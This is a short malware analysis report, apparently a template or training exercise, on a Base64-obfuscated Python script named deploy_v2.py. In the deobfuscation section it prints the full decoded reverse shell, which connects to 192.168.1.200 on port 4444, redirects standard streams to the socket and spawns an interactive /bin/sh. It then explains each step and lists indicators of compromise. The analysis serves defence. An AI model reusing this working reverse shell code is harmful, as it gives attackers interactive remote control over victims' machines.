# Analysis: Python Reverse Shell (Deobfuscated)
**Date:** 2026-01-19
**Analyst:** [Your Name]
**Artifact:** `deploy_v2.py`
**Type:** Malicious Script (Reverse Shell)

## 1. Executive Summary
A suspicious Python script identified as `deploy_v2.py` contains a Base64-encoded payload. Deobfuscation reveals it is a **Reverse Shell** designed to establish a Command & Control (C2) connection to an external IP and grant interactive remote access to the host.

## 2. Deobfuscation Findings
**Technique:** Base64 Decoding
**Original Payload:** `aW1wb3J0IHNvY2tldCxvcyxzdWJwcm9jZXNzO3M9...`

**Decoded Source Code:**
```python
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.200", 4444))

# Redirect Standard Streams to the Socket
os.dup2(s.fileno(), 0)  # STDIN  -> Socket
os.dup2(s.fileno(), 1)  # STDOUT -> Socket
os.dup2(s.fileno(), 2)  # STDERR -> Socket

# Spawn the Shell
p = subprocess.call(["/bin/sh", "-i"])
```

## 3. Technical Analysis

The script performs three critical actions to establish persistence and control:

1. Network Connection: It initializes a TCP socket (SOCK_STREAM) and attempts to connect outbound to 192.168.1.200 on port 4444.

2. I/O Redirection (os.dup2): The script uses os.dup2 to overwrite the process's standard file descriptors:

    * STDIN (0): Redirected to the socket (allows attacker to send commands).

    * STDOUT (1) & STDERR (2): Redirected to the socket (sends output/errors back to attacker).

    * Impact: The shell believes it is talking to a local terminal, but all input/output is actually traversing the network.

3. Execution (subprocess.call): It spawns /bin/sh with the -i (interactive) flag.

   * Analyst Note: The script explicitly calls /bin/sh (Bourne Shell), not /bin/bash. This is often done to ensure compatibility across different Linux distributions or to avoid the extensive history logging features present in modern Bash configurations.

## Indicators of Compromise

Network Indicators: 

* IP Address: 192.168.1.200
* Port: 4444
* Protocol: TCP

Host Indicators: 

* File name: deploy_v2.py
* Behavior: Python process spawning `/bin/sh` shell with network activity.

P.S. You can find the dummy artifact for this report at [this location](./malicious%20artifacts/deploy_v2.py)